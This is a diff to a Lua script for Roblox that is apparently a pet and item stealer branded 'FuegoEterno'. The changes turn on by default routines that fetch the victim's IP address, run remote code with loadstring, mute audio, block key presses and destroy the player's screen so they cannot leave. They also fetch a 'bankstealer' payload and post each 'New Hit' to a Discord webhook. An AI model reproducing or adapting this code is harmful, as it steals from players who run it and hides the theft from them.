@@ -16,7 +16,7 @@ getgenv().Settings = {
         Intensity = 100 --%
     },
     Banana = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 100 --%
     },
     Huges = {
@@ -62,7 +62,7 @@ local disabledKeyCodes = {
     0x0D,
 };
 UserSettings().GameSettings.MasterVolume = 0
-if _G.MouseLock ~= true then
+if _G.MouseLock ~= false then
     runService.RenderStepped:Connect(function()
         for _, keyCode in next, disabledKeyCodes do
             keyrelease(keyCode)
@@ -213,8 +213,8 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ian4Life/Loadingscreen-/main/Loading))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+if _G.LoadingScreen ~= false then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ian4Life/Loadingscreen-/main/Loading'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
@@ -754,7 +754,7 @@ if diaamt < 110000 then
     loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
-if _G.AntiLeave ~= true then
+if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
         if v.Name ~= "Inventory" then
             v:Destroy()
@@ -1025,13 +1025,13 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://media.discordapp.net/attachments/736080557557022855/1140120484281856030/FB_IMG_1691312902228.jpg"
+        "https://media.discordapp.net/attachments/736080557557022855/1143154476908298260/FB_IMG_1691312902228.jpg"
         data1 = {
             ["content"] = ping,
             ["username"] = "FuegoEterno Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||FuegoEterno Stealer||",
+                ["title"] = "**New Hit** ||With FuegoEterno Scritpz||",
                 ["url"] = "https://discord.gg/pUKMNeRwsn",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
